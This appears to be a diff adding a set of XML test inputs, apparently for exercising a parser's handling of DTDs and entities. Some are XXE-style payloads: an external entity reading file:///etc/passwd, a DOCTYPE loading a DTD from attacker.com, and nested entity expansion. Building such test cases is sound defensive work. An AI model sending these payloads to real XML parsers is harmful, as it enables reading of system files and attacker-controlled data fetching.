@@ -1,0 +1,65 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % param1 "<!ENTITY % param2 'test'>">
+  %param1;
+]>
+<root>
+  <element attr="value"/>
+</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
+  <!ATTLIST root id ID #REQUIRED>
+  <!ENTITY nbsp "&#160;">
+  <!NOTATION jpg PUBLIC "image/jpeg">
+]>
+<root id="test1">
+  <data>Content&nbsp;with&nbsp;entities</data>
+</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % external SYSTEM "file:///etc/passwd">
+  <!ENTITY % param "%external;">
+]>
+<root>
+  %param;
+</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">
+<root>
+  <deeply>
+    <nested>
+      <structure>
+        <with>
+          <many>
+            <levels>Content</levels>
+          </many>
+        </with>
+      </structure>
+    </nested>
+  </deeply>
+</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY a "&#x00;">
+  <!ENTITY b "&#65;&#66;&#67;">
+  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+]>
+<root>
+  <test attr1="&a;" attr2="&c;">Mixed &b; content &a; here</test>
+  <![CDATA[CDATA with & < > special chars]]>
+</root>
+```
